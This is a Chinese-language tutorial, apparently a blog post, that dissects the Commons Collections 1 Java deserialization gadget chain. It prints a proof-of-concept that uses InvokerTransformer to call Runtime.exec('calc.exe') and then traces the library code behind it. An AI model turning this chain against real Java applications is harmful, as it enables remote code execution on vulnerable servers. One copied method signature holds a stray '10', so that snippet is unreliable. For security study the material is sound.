### CC链的介绍

>   Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合工具类。
>
> 作为Apache开源项⽬的重要组件，Commons Collections被⼴泛应⽤于各种Java应⽤的开发，⽽正 是因为在⼤量web应⽤程序中这些类的实现以及⽅法的调⽤，导致了反序列化⽤漏洞的普遍性和严重性。
>
> Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer。

* 简单来说就是利用org.apache.commons.collections中的各种类构成的序列化对象,实现序列化漏洞的利用.由于该库中的各种类极其丰富,有不止一种链条来引发反序列化漏洞.

### P牛的CommonCollections1分析

#### 代码分析

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.util.HashMap;
import java.util.Map;

public class CommonCollections1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };

        Transformer transformerChain = new
                ChainedTransformer(transformers);

        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null,
                transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

```java
//  Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
// 对innerMap进行修饰,当返回对象outerMap put(key,value)时,调用了transformerChain.transform(key)
public static Map decorate(Map map, Transformer keyTransformer, Transformer 10valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    super(map);
    this.keyTransformer = keyTransformer;
    this.valueTransformer = valueTransformer;
}

public Object put(Object key, Object value) {
    key = transformKey(key);
    value = transformValue(value);  
    return getMap().put(key, value);
}

protected Object transformKey(Object object) {
    if (keyTransformer == null) {
        return object;  
    }
    return keyTransformer.transform(object);
}

protected Object transformValue(Object object) {
    if (valueTransformer == null) {
        return object;
    }
    return valueTransformer.transform(object);
}
```

```java
// 来到了transformerChain.transform(key)
// Transformer transformerChain = new ChainedTransformer(transformers);
// transformerChain.transform(key)遍历调用了数组transformers中的元素的方法transform
public class ChainedTransformer implements Transformer, Serializable {
    // ......
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
    // Transformer是一个接口,只有一个待实现的方法transform
    public Object transform(Object object) {
            for (int i = 0; i < iTransformers.length; i++) {
                object = iTransformers[i].transform(object);
            }
            return object;
        }
    // ......
}
```

```java
// 再来到数组transformers
/* Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[]
                                {"calc.exe"}),
        };*/
// new ConstantTransformer(Runtime.getRuntime())
public class ConstantTransformer implements Transformer, Serializable {
    // ...
     public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }
    public Object transform(Object input) {
        return iConstant;
    }
    // ...
}
// new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
public class InvokerTransformer implements Transformer, Serializable {
    // ...
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
    // ...
}
```

```java
// 所以key="test";transformerChain.transform(key)实际上执行了什么
// transformers[0].transform("test")
object = (Object) Runtime.getRuntime();

// transformers[1].transform(object)
Class cls = object.getClass();
Method method = cls.getMethod("exec", new Class[]{String.class});
method.invoke(object, new Object[]{"calc.exe"});
```

